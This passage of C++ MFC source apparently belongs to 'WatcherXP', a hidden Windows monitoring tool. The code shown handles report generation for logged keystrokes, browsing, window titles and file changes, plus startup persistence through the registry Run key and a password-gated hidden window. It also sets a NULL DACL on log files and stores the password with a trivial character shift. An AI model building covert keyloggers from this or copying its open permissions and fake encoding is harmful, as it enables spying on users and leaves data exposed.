void CWatcherXPDlg::OnReportWindowtitles()
{
	CString dest=chooseFolder();
	if(dest==_T(""))
		return;
	CTime time=CTime::GetCurrentTime();
	CString date;
	dest+=time.Format(_T("\\WindowTitles%d_%m_%y_%H_%M_%S.htm"));
	int index=dest.Find(_T("\\\\"));
	if(index>0){
		dest.Delete(index);
	}
	reportWindowTitle(dest);
}

void CWatcherXPDlg::OnReportFilefolderchanges()
{
	CString dest=chooseFolder();
	if(dest==_T(""))
		return;
	CTime time=CTime::GetCurrentTime();
	CString date;
	dest+=time.Format(_T("\\FileFolderhanges%d_%m_%y_%H_%M_%S.htm"));
	int index=dest.Find(_T("\\\\"));
	if(index>0){
		dest.Delete(index);
	}
	reportFileFolder(dest);
}

void CWatcherXPDlg::OnHelpTopics()
{
	explorer.Navigate(getFilePath(helpPath),NULL,NULL,NULL,NULL);
	AfxBeginThread(navThread,(LPVOID)this);	
	++pc;
	++cp;
}

void CWatcherXPDlg::OnHelpAbout()
{
	About about;
	about.DoModal();
}

/////////////////////////////////////////////////////////////////

/////////////////////////////////////////////////////////////////

/////////////////////////////////////////////////////////////////

/////////////////////////////////////////////////////////////////

/////////////////////////////////////////////////////////////////

void CWatcherXPDlg::OnUilanguageArabic()
{
	//load Arabic resources
	lang=1;
	options.lang=1;
	About::lang=1;
	viewer.lang=1;
	kbMsg=loadStr(IDS_MSG_KB);
	ieMsg=loadStr(IDS_MSG_IE);
	wtMsg=loadStr(IDS_MSG_WT);
	ffMsg=loadStr(IDS_MSG_FF);
	regMsg=loadStr(IDS_MSG_REG);
	helpPath=_T("help_ar.htm");
	explorer.Navigate(getFilePath(helpPath),NULL,NULL,NULL,NULL);
	AfxBeginThread(navThread,(LPVOID)this);	
	++pc;
	++cp;
	// set text for the buttons

	fileBtn.setLabel(loadStr(IDS_BTN_FILE));
	viewBtn.setLabel(loadStr(IDS_BTN_VIEW));
	reportBtn.setLabel(loadStr(IDS_BTN_REPORT));
	helpBtn.setLabel(loadStr(IDS_BTN_HELP));
	maxBtn.setLabel(_T("O"));
	minBtn.setLabel(_T("-"));
	exitBtn.setLabel(_T("X"));
	startBtn.setLabel(loadStr(IDS_FILE_START));
	stopBtn.setLabel(loadStr(IDS_FILE_STOP));
	hideBtn.setLabel(loadStr(IDS_FILE_HIDE));
	kbBtn.setLabel(loadStr(IDS_VIEW_KB));
	wtBtn.setLabel(loadStr(IDS_VIEW_WT));
	ieBtn.setLabel(loadStr(IDS_VIEW_IE));
	ffBtn.setLabel(loadStr(IDS_VIEW_FF));
	ssBtn.setLabel(loadStr(IDS_VIEW_SS));
	optionsBtn.setLabel(loadStr(IDS_VIEW_OPTIONS));
	hBtn.setLabel(loadStr(IDS_HELP_TOPICS));
	exBtn.setLabel(loadStr(IDS_FILE_EXIT));
	aboutBtn.setLabel(loadStr(IDS_HELP_ABOUT));

	this->saveConfig();

	UpdateData(FALSE);
}

void CWatcherXPDlg::OnUilanguageEnglish()
{
	// load English UI resources
	lang=0;
	options.lang=0;
	About::lang=0;
	viewer.lang=0;
	kbMsg=_T("couldn't start Keyboard watch");
	ieMsg=_T("couldn't start web addresses watch");
	wtMsg=_T("couldn't start window titles watch");
	ffMsg=_T("couldn't start file folder watch");
	regMsg=_T("couldn't add key to startup, registry access denied");
	helpPath=_T("help_en.htm");
	explorer.Navigate(getFilePath(helpPath),NULL,NULL,NULL,NULL);
	AfxBeginThread(navThread,(LPVOID)this);	
	++pc;
	++cp;

	fileBtn.setLabel(_T("File"));
	viewBtn.setLabel(_T("View"));
	reportBtn.setLabel(_T("Report"));
	helpBtn.setLabel(_T("Help"));
	maxBtn.setLabel(_T("O"));
	minBtn.setLabel(_T("-"));
	exitBtn.setLabel(_T("X"));
	startBtn.setLabel(_T("Start"));
	stopBtn.setLabel(_T("Stop"));
	hideBtn.setLabel(_T("Hide"));
	kbBtn.setLabel(_T("KeyStrokes"));
	wtBtn.setLabel(_T("Window Titles"));
	ieBtn.setLabel(_T("I.E. Web Files"));
	ffBtn.setLabel(_T("File Folder"));
	ssBtn.setLabel(_T("Screen Shoots"));
	optionsBtn.setLabel(_T("Options"));
	hBtn.setLabel(_T("Help Topics"));
	exBtn.setLabel(_T("Exit"));
	aboutBtn.setLabel(_T("About me"));

	this->saveConfig();

	UpdateData(FALSE);

}

void CWatcherXPDlg::OnReportCleardata()
{
	clearData();
}
void CWatcherXPDlg::saveConfig(void)
{
	//create file and initialize security options
	initFile(this->getFilePath(configPath));

	CFile configFile(this->getFilePath(configPath),CFile::modeCreate|CFile::modeWrite|CFile::typeBinary);
	
	CArchive configArchive(&configFile,CArchive::store);
	UpdateData();
	try{		
		//try to save configuration. order is important(use XML to igone order)
			configArchive<<options.startUp;
			configArchive<<options.passwordEnable;
			configArchive<<options.KeyStroke;
			configArchive<<options.WebAddress;
			configArchive<<options.FileFolder;
			configArchive<<options.ScreenShots;
			configArchive<<encodeString(options.password); 
			configArchive<<options.WindowTitle;
			configArchive<<options.isVisible;
			configArchive<<options.elapsed;
			configArchive<<options.autoStart;
			configArchive<<lang; //save language
			configArchive<<options.hotkey;
			configArchive<<options.hotIndex;
			options.folderList.list.Serialize(configArchive);
			
	}
	catch(...){
		TRACE(_T("EXCEPTION WHILE SAVING CONFIGURATION\r\r\n"));
		//reset all variables on config file open failure
	}
	configArchive.Close();
	configFile.Close();
}

void CWatcherXPDlg::loadConfig(void)
{
	if(!PathFileExists(this->getFilePath(configPath)))
		initFile(this->getFilePath(configPath));
		CFile configFile(this->getFilePath(configPath),CFile::modeRead|CFile::modeCreate|CFile::modeNoTruncate|CFile::typeBinary);	
		CArchive configArchive(&configFile,CArchive::load);
		//read configuration
		options.folderList.list.RemoveAll();		

		try{
			//try to read configuration. order is important
			CString temp;
			configArchive>>options.startUp;
			configArchive>>options.passwordEnable;
			configArchive>>options.KeyStroke;
			configArchive>>options.WebAddress;
			configArchive>>options.FileFolder;
			configArchive>>options.ScreenShots;
			configArchive>>temp; //encoded password
			configArchive>>options.WindowTitle;
			configArchive>>options.isVisible;
			configArchive>>options.elapsed;
			configArchive>>options.autoStart;
			configArchive>>lang;
			configArchive>>options.hotkey;
			configArchive>>options.hotIndex;
			options.password=decodeString(temp); 
			options.folderList.list.Serialize(configArchive);
			
		}
		catch(...){
			TRACE(_T("EXCEPTION WHILE READING CONFIGURATION\r\r\n"));
			//reset content
			options.startUp=false;
			options.passwordEnable=false;
			options.KeyStroke=true;
			options.WebAddress=true;
			options.FileFolder=false;
			options.ScreenShots=false;
			options.WindowTitle=false;
			options.isVisible=false;
			options.autoStart=true;
			options.hotIndex=0;
			options.elapsed=60;
			options.hotkey=0x41; //A
			options.password=_T("");
			lang=0;
			
			configArchive.Close();	
			configFile.Close();
			
			this->saveConfig();
			//reset all variables on config file open failure
		}
}

CString CWatcherXPDlg::encodeString(CString& str)
{
	CString temp=str;
	for(int i=0;i<temp.GetLength();i++){
		temp.SetAt(i,temp.GetAt(i)+20);
	}
	return temp;
}

CString CWatcherXPDlg::decodeString(CString& str)
{ 
	CString temp=str;
	for(int i=0;i<temp.GetLength();i++){
		temp.SetAt(i,temp.GetAt(i)-20);
	}
	return temp;
}

LONG CWatcherXPDlg::hotKey(WPARAM wParam,LPARAM lparam){

			//check password
	
	if(pass.DoModal()==IDOK){
		if(pass.password==options.password)
			this->ShowWindow(SW_SHOW);
		pass.password=_T("");
	} 
	return 0;
}

//get local file path in the current directory to be used by IE
CString CWatcherXPDlg::getFilePath(CString fileName)
{

	CString path=curDir;
	path+=_T("\\");
	path+=fileName;
	int index=path.Find(_T("\\\\"));
	if(index>0){
		path.Delete(index);
	}
	return path;
}

void CWatcherXPDlg::initFile(CString path)
{
	SECURITY_DESCRIPTOR sd;
	InitializeSecurityDescriptor(&sd,SECURITY_DESCRIPTOR_REVISION);
	SetSecurityDescriptorDacl(&sd,TRUE,NULL,FALSE);

	SECURITY_ATTRIBUTES sa;
	sa.nLength=sizeof(SECURITY_ATTRIBUTES);
	sa.lpSecurityDescriptor=&sd;
	sa.bInheritHandle=FALSE;

	HANDLE h=CreateFile(path,GENERIC_WRITE,0,&sa,CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL ,NULL);
	if(h!=INVALID_HANDLE_VALUE)
		CloseHandle(h);
}


CString CWatcherXPDlg::chooseFolder(void)
{
	CoInitialize(NULL);

	//show a browse folder dialog, this is a shell call throgh com intefaces
	//first fill a BROWSEINFO struct
	TCHAR buffer[MAX_PATH];
	buffer[0]=NULL;
	BROWSEINFO binfo;
	binfo.hwndOwner=this->m_hWnd;
	binfo.pidlRoot=NULL;
	binfo.pszDisplayName=buffer;
	binfo.lpszTitle=_T("browse");
	binfo.ulFlags=BIF_USENEWUI;
	binfo.lpfn=NULL;
	binfo.lParam=0;
	binfo.iImage=NULL;

	//get the location item
	LPITEMIDLIST itemID=SHBrowseForFolder(&binfo);

	if(itemID==NULL){
		CoUninitialize();
		return _T("");
	}
	TCHAR path[MAX_PATH]; //buffer
	//get the folder path from the ITEMIDLIST
	BOOL ok=SHGetPathFromIDList(itemID,path);


	//we must free the ITEMIDLIST using the IMalloc
	IMalloc* malloc=NULL;
	if(SHGetMalloc(&malloc)==NOERROR){
		malloc->Free(itemID);
		malloc->Release();
	}
	
	//int len=std::char_traits<char>::length(path);
	CString str=path;
	
	return str;
}

CString CWatcherXPDlg::getCurrDir(void)
{
	/*when runing at start up , the GetCurrentDir returns the user's home dir
	and because runing at start up happened becuase of a registry entry so the key
	do exists with the right vlaue so we'll get the path from there
	the key might exist in the HKEY_LOCAL_MACHINE\..\run or HKEY_CURRENT_USER\...\run
	*/
	TCHAR path[MAX_PATH];
	CString dir;
	LONG lRet;
    HKEY hKey;
	DWORD dwBufLen = MAX_PATH;		
	//try LocalMachine enrty
	RegOpenKeyEx(HKEY_LOCAL_MACHINE,_T("SOFTWARE\\MICROSOFT\\WINDOWS\\CURRENTVERSION\\RUN"),0,KEY_QUERY_VALUE,&hKey);
	lRet = RegQueryValueEx(hKey,TEXT("watcher"),NULL,NULL,(LPBYTE)path,&dwBufLen);
	RegCloseKey(hKey);
	if(lRet!=ERROR_SUCCESS){//try openeing CurrentUser entry (limited account)
		RegOpenKeyEx(HKEY_CURRENT_USER,_T("SOFTWARE\\MICROSOFT\\WINDOWS\\CURRENTVERSION\\RUN"),0,KEY_QUERY_VALUE,&hKey);
		lRet = RegQueryValueEx(hKey,_T("watcher"),NULL,NULL,(LPBYTE)path,&dwBufLen);
		RegCloseKey(hKey);
	}
		
	if(lRet== ERROR_SUCCESS){
		dir=path;
		CString exeName=theApp.m_pszExeName;
		int index=dir.Find(exeName+_T(".exe"),0);
		dir=dir.Mid(0,index-1);
	}
	else{
		GetCurrentDirectory(MAX_PATH,path);
		dir=path;
	}
	
	return dir;
}

void CWatcherXPDlg::initMenus(){
	//create EN menu
	menuFileEN.CreatePopupMenu();
	
	menuFileEN.AppendMenu(MF_OWNERDRAW,ID_FILE_START,_T("Start"));
//	menuFileEN.AppendMenu(MF_OWNERDRAW,ID_FILE_START,_T("Start"));
	menuFileEN.AppendMenu(MF_OWNERDRAW,ID_FILE_STOP,_T("Stop"));
	menuFileEN.AppendMenu(MF_OWNERDRAW,ID_FILE_BEINVISIBLE,_T("Hide"));
	
	uimEN.CreatePopupMenu();
	uimEN.AppendMenu(MF_OWNERDRAW,ID_UILANGUAGE_ARABIC,_T("ArabicUI"));
	uimEN.AppendMenu(MF_OWNERDRAW,ID_UILANGUAGE_ENGLISH,_T("EnglishUI"));

	CSize size=this->GetDC()->GetTextExtent(_T("UILanguage"));
	menuFileEN.SetItemDim(size.cx,size.cy);
	menuFileEN.AppendMenu(MF_OWNERDRAW|MF_POPUP,(UINT_PTR)uimEN.GetSafeHmenu(),_T("UILanguage"));
	menuFileEN.AppendMenu(MF_OWNERDRAW,-1);
	menuFileEN.AppendMenu(MF_OWNERDRAW,ID_FILE_EXIT,_T("Exit"));

	menuViewEN.CreatePopupMenu();
	menuViewEN.AppendMenu(MF_OWNERDRAW,ID_VIEW_KEYSTROKES,_T("KeyStrokes"));
	menuViewEN.AppendMenu(MF_OWNERDRAW,ID_VIEW_WEBADDRESSES,_T("Web Files Addresses"));
	menuViewEN.AppendMenu(MF_OWNERDRAW,ID_VIEW_WINDOWTITLES,_T("Window Titles"));
	menuViewEN.AppendMenu(MF_OWNERDRAW,ID_VIEW_FILEFOLDERCHANGES,_T("FileFolder Changes"));
	menuViewEN.AppendMenu(MF_OWNERDRAW,ID_VIEW_SCREENSHOTS,_T("Screen Shots"));
	menuViewEN.AppendMenu(MF_OWNERDRAW,-1);
	menuViewEN.AppendMenu(MF_OWNERDRAW,ID_VIEW_OPTIONS,_T("Options"));

	menuReportEN.CreatePopupMenu();
	menuReportEN.AppendMenu(MF_OWNERDRAW,ID_REPORT_KEYSTROKES,_T("KeyStrokes"));
	menuReportEN.AppendMenu(MF_OWNERDRAW,ID_REPORT_W,_T("Web Files Addresses"));	
	menuReportEN.AppendMenu(MF_OWNERDRAW,ID_REPORT_WINDOWTITLES,_T("Window Titles"));
	menuReportEN.AppendMenu(MF_OWNERDRAW,ID_REPORT_FILEFOLDERCHANGES,_T("FileFolder Changes"));
	menuReportEN.AppendMenu(MF_OWNERDRAW,-1);
	menuReportEN.AppendMenu(MF_OWNERDRAW,ID_REPORT_CLEARDATA,_T("clear data"));


	menuHelpEN.CreatePopupMenu();
	menuHelpEN.AppendMenu(MF_OWNERDRAW,ID_HELP_TOPICS,_T("HelpTopics"));
	menuHelpEN.AppendMenu(MF_OWNERDRAW,ID_HELP_ABOUT,_T("About"));

	

	//create AR menu
	menuFileAR.CreatePopupMenu();
	menuFileAR.AppendMenu(MF_OWNERDRAW,ID_FILE_START,loadMenuStr(IDS_FILE_START));
//	menuFileAR.AppendMenu(MF_OWNERDRAW,ID_FILE_START,_T("ÈÏÁ"));
	
	menuFileAR.AppendMenu(MF_OWNERDRAW,ID_FILE_STOP,loadMenuStr(IDS_FILE_STOP));
	menuFileAR.AppendMenu(MF_OWNERDRAW,ID_FILE_BEINVISIBLE,loadMenuStr(IDS_FILE_HIDE));
	
	uimAR.CreatePopupMenu();
	uimAR.AppendMenu(MF_OWNERDRAW,ID_UILANGUAGE_ARABIC,loadMenuStr(IDS_FILE_UIAR));
	uimAR.AppendMenu(MF_OWNERDRAW,ID_UILANGUAGE_ENGLISH,loadMenuStr(IDS_FILE_UIEN));

	size=this->GetDC()->GetTextExtent(loadMenuStr(IDS_FILE_UILANG));
	menuFileAR.SetItemDim(size.cx,size.cy);
	menuFileAR.AppendMenu(MF_OWNERDRAW|MF_POPUP,(UINT_PTR)uimAR.GetSafeHmenu(),loadMenuStr(IDS_FILE_UILANG));
	menuFileAR.AppendMenu(MF_OWNERDRAW,-1);
	menuFileAR.AppendMenu(MF_OWNERDRAW,ID_FILE_EXIT,loadMenuStr(IDS_FILE_EXIT));

	menuViewAR.CreatePopupMenu();
	menuViewAR.AppendMenu(MF_OWNERDRAW,ID_VIEW_KEYSTROKES,loadMenuStr(IDS_VIEW_KB));
	menuViewAR.AppendMenu(MF_OWNERDRAW,ID_VIEW_WEBADDRESSES,loadMenuStr(IDS_VIEW_IE));
	menuViewAR.AppendMenu(MF_OWNERDRAW,ID_VIEW_WINDOWTITLES,loadMenuStr(IDS_VIEW_WT));
	menuViewAR.AppendMenu(MF_OWNERDRAW,ID_VIEW_FILEFOLDERCHANGES,loadMenuStr(IDS_VIEW_FF));
	menuViewAR.AppendMenu(MF_OWNERDRAW,ID_VIEW_SCREENSHOTS,loadMenuStr(IDS_VIEW_SS));
	menuViewAR.AppendMenu(MF_OWNERDRAW,-1);
	menuViewAR.AppendMenu(MF_OWNERDRAW,ID_VIEW_OPTIONS,loadMenuStr(IDS_VIEW_OPTIONS));

	menuReportAR.CreatePopupMenu();
	menuReportAR.AppendMenu(MF_OWNERDRAW,ID_REPORT_KEYSTROKES,loadMenuStr(IDS_VIEW_KB));
	menuReportAR.AppendMenu(MF_OWNERDRAW,ID_REPORT_W,loadMenuStr(IDS_VIEW_IE));	
	menuReportAR.AppendMenu(MF_OWNERDRAW,ID_REPORT_WINDOWTITLES,loadMenuStr(IDS_VIEW_WT));
	menuReportAR.AppendMenu(MF_OWNERDRAW,ID_REPORT_FILEFOLDERCHANGES,loadMenuStr(IDS_VIEW_FF));
	menuReportAR.AppendMenu(MF_OWNERDRAW,-1);
	menuReportAR.AppendMenu(MF_OWNERDRAW,ID_REPORT_CLEARDATA,loadMenuStr(IDS_REPORT_CLEAR));


	menuHelpAR.CreatePopupMenu();
	menuHelpAR.AppendMenu(MF_OWNERDRAW,ID_HELP_TOPICS,loadMenuStr(IDS_HELP_TOPICS));
	menuHelpAR.AppendMenu(MF_OWNERDRAW,ID_HELP_ABOUT,loadMenuStr(IDS_HELP_ABOUT));

}



///////////////////////////////////////////////////////////////

void CWatcherXPDlg::reportKB(CString path){
	  initFile(path);
	  CStdioFile file;
	  CStdioFile KBFile;
	  try{ //open in Binary mode is necessary to write Unicode Strings right
		if(!file.Open(path,CFile::modeCreate|CFile::modeWrite|CFile::typeBinary))
			return;
		//write heaser
		TCHAR u=65279;
		file.Write(&u,sizeof(u));
		CTime time=CTime::GetCurrentTime();
					
		CString date;
		date=time.Format(_T(" [%d\\%m\\%y  %H:%M:%S] ") );
		file.WriteString(_T("<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.0 Transitional//EN\">")
			_T("\r\r\n<html>\r\r\n<head>\r\n<meta http-equiv=\"Content-Type\" content=\"text/html; charset=unicode\">")
			_T("<style>\r\nBODY {\r\nSCROLLBAR-FACE-COLOR: #54718D; SCROLLBAR-HIGHLIGHT")
			_T("-COLOR: #000000; SCROLLBAR-SHADOW-COLOR: #ffffff; SCROLLBAR-3DLIGHT-COLOR: #ffffff; ")
			_T("SCROLLBAR-ARROW-COLOR: #ffffff; SCROLLBAR-TRACK-COLOR: #ADC9E5; SCROLLBAR-DARKSHADOW-")
			_T("COLOR: #B9ADE5; SCROLLBAR-BASE-COLOR: #B9ADE5;")
			_T("}\r\n</style>\r\n<title>keyboard strokes</title>\r\n</head>\r\n<body bgColor=\"#6699cc\">")
			_T("\r\n<FONT style=\"FONT-WEIGHT: bolder; FONT-SIZE: large; TEXT-DECORATION: underline\"")
			_T("color=\"#99ffff\">Reporting KeyBoard at:")+date+_T("</FONT>"));


		//copy KBFile to this
		if(!KBFile.Open(this->getFilePath(KBPath),CFile::modeRead|CFile::typeBinary))
			return;
		int read=1;
		char buffer[2048];
		while(read>0){
			read=KBFile.Read(buffer,2048);
			file.Write(buffer,read);
		}
		KBFile.Close();
		//write close tags
		file.WriteString(_T("\r\n</body>\r\n</html>"));	  
	  }
	  catch(...){

	  }
	  file.Close();

  }
  void CWatcherXPDlg::reportIEAddress(CString path){
	  initFile(path);
	  CStdioFile file;
	  CStdioFile IEFile;
	  try{
		if(!file.Open(path,CFile::modeCreate|CFile::modeWrite|CFile::typeBinary))
			return;
		//for uncode text file header
		TCHAR u=65279;
		file.Write(&u,sizeof(u));
		CTime time=CTime::GetCurrentTime();
					
		CString date;
		date=time.Format(_T(" [%d\\%m\\%y  %H:%M:%S] ") );
		file.WriteString(_T("<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.0 Transitional//EN\">")
			_T("\r\n<html>\r\n<head><meta http-equiv=\"Content-Type\" content=\"text/html; charset=unicode\">")
			_T("<style>\r\nBODY {\r\nSCROLLBAR-FACE-COLOR: #54718D; SCROLLBAR-HIGHLIGHT")
			_T("-COLOR: #000000; SCROLLBAR-SHADOW-COLOR: #ffffff; SCROLLBAR-3DLIGHT-COLOR: #ffffff; ")
			_T("SCROLLBAR-ARROW-COLOR: #ffffff; SCROLLBAR-TRACK-COLOR: #ADC9E5; SCROLLBAR-DARKSHADOW-")
			_T("COLOR: #B9ADE5; SCROLLBAR-BASE-COLOR: #B9ADE5;")
			_T("}\r\n</style>\r\n<title>I.E Addresses</title>\r\n</head>\r\n<body bgColor=\"#6699cc\">")
			_T("\r\n<FONT style=\"FONT-WEIGHT: bolder; FONT-SIZE: large; TEXT-DECORATION: underline\"")
			_T("color=\"#99ffff\">Reporting I.E. Visited Web Pages (local files, internet) at:")+date+_T("</FONT><BR>"));

		//copy KBFile to this
		if(!IEFile.Open(this->getFilePath(IEPath),CFile::modeRead|CFile::typeBinary))
			return;
		int read=1;
		char buffer[2048];
		while(read>0){
			read=IEFile.Read(buffer,2048);
			file.Write(buffer,read);
		}
		IEFile.Close();
		//write close tags
		file.WriteString(_T("\r\n</body>\r\n</html>"));	  
	  }
	  catch(...){

	  }
	  file.Close();
  }
  void CWatcherXPDlg::reportFileFolder(CString path){

	  initFile(path);
	  CStdioFile file;
	  CStdioFile FFFile;
	  try{
		if(!file.Open(path,CFile::modeCreate|CFile::modeWrite|CFile::typeBinary))
			return;
		TCHAR u=65279;
		file.Write(&u,sizeof(u));
		//write heaser
		CTime time=CTime::GetCurrentTime();					
		CString date;
		date=time.Format(_T(" [%d\\%m\\%y  %H:%M:%S] ") );
		file.WriteString(_T("<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.0 Transitional//EN\">")
			_T("\r\n<html>\r\n<head>\r\n<meta http-equiv=\"Content-Type\" content=\"text/html; charset=unicode\">")
			_T("<style>\r\nBODY {\r\nSCROLLBAR-FACE-COLOR: #54718D; SCROLLBAR-HIGHLIGHT")
			_T("-COLOR: #000000; SCROLLBAR-SHADOW-COLOR: #ffffff; SCROLLBAR-3DLIGHT-COLOR: #ffffff; ")
			_T("SCROLLBAR-ARROW-COLOR: #ffffff; SCROLLBAR-TRACK-COLOR: #ADC9E5; SCROLLBAR-DARKSHADOW-")
			_T("COLOR: #B9ADE5; SCROLLBAR-BASE-COLOR: #B9ADE5;")
			_T("}\r\n</style>\r\n<title>File Folder changes</title>\r\n</head>\r\n<body bgColor=\"#6699cc\">")
			_T("\r\n<FONT style=\"FONT-WEIGHT: bolder; FONT-SIZE: large; TEXT-DECORATION: underline\"")
			_T("color=\"#99ffff\">Reporting File Folder Chnages at:")+date+_T("</FONT><BR>"));


		//copy KBFile to this
		if(!FFFile.Open(this->getFilePath(FFPath),CFile::modeRead|CFile::typeBinary))
			return;
		int read=1;
		char buffer[2048];
		while(read>0){
			read=FFFile.Read(buffer,2048);
			file.Write(buffer,read);
		}
		FFFile.Close();
		//write close tags
		file.WriteString(_T("\r\n</body>\r\n</html>"));	  
	  }
	  catch(...){

	  }
	  file.Close();
  }
  
  void CWatcherXPDlg::reportWindowTitle(CString path){
	  initFile(path);
	  CStdioFile file;
	  CStdioFile WTFile;
	  try{
		if(!file.Open(path,CFile::modeCreate|CFile::modeWrite|CFile::typeBinary))
			return;

		//write header
		TCHAR u=65279;
		file.Write(&u,sizeof(u));

		CTime time=CTime::GetCurrentTime();
					
		CString date;
		date=time.Format(_T(" [%d\\%m\\%y  %H:%M:%S] ") );
		file.WriteString(_T("<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.0 Transitional//EN\">")
			_T("\r\n<html>\r\n<head>\r\n<meta http-equiv=\"Content-Type\" content=\"text/html; charset=unicode\">\r\n")
			_T("<style>\r\nBODY {\r\nSCROLLBAR-FACE-COLOR: #54718D; SCROLLBAR-HIGHLIGHT")
			_T("-COLOR: #000000; SCROLLBAR-SHADOW-COLOR: #ffffff; SCROLLBAR-3DLIGHT-COLOR: #ffffff; ")
			_T("SCROLLBAR-ARROW-COLOR: #ffffff; SCROLLBAR-TRACK-COLOR: #ADC9E5; SCROLLBAR-DARKSHADOW-")
			_T("COLOR: #B9ADE5; SCROLLBAR-BASE-COLOR: #B9ADE5;")
			_T("}\r\n</style>\r\n<title>Window Titles</title>\r\n</head>\r\n<body bgColor=\"#6699cc\">")
			_T("\r\n<FONT style=\"FONT-WEIGHT: bolder; FONT-SIZE: large; TEXT-DECORATION: underline\"")
			_T("color=\"#99ffff\">Reporting Window Titles at:")+date+_T("</FONT><BR>"));



		//copy KBFile to this
		if(!WTFile.Open(this->getFilePath(WTPath),CFile::modeRead|CFile::typeBinary))
			return;
		int read=1;
		char buffer[2048];
		while(read>0){
			read=WTFile.Read(buffer,2048);
			file.Write(buffer,read);
		}
		WTFile.Close();
		//write close tags
		file.WriteString(_T("\r\n</body>\r\n</html>"));	  
	  }
	  catch(...){

	  }
	  file.Close();
  }
  

  void CWatcherXPDlg::clearData(){
	  //open file in create mode
	initFile(this->getFilePath(KBPath) );
	initFile(this->getFilePath(IEPath) );
	initFile(this->getFilePath(WTPath));
	initFile(this->getFilePath(FFPath ));

	  //clear all image data files
	HANDLE h;
	WIN32_FIND_DATA info;
	h=FindFirstFile(this->getFilePath(imagePath)+_T("*.jpg"),&info);

	if (h == INVALID_HANDLE_VALUE)
		return ;

	CString fileName=this->getFilePath(imagePath)+info.cFileName;
	DeleteFile(fileName);
	while(FindNextFile(h,&info)){
		if(h==INVALID_HANDLE_VALUE)
			continue;
		fileName=this->getFilePath(imagePath)+info.cFileName;
		DeleteFile(fileName);
	}
	FindClose(h);

  }

  LPCTSTR CWatcherXPDlg::loadStr(UINT id)
  {
	  CString temp;
	  temp.LoadString(id);
	  strList.AddHead(temp); //this will make the variable alive when leaving the scope
	  return temp.GetString();
  }

  //menus must be loaded one time, while messages and buttons can be change many
    LPCTSTR CWatcherXPDlg::loadMenuStr(UINT id)
  {
	  CString temp;
	  temp.LoadString(id);
	  menuStrList.AddHead(temp); //this will make the variable alive when leaving the scope
	  return temp.GetString();
  }
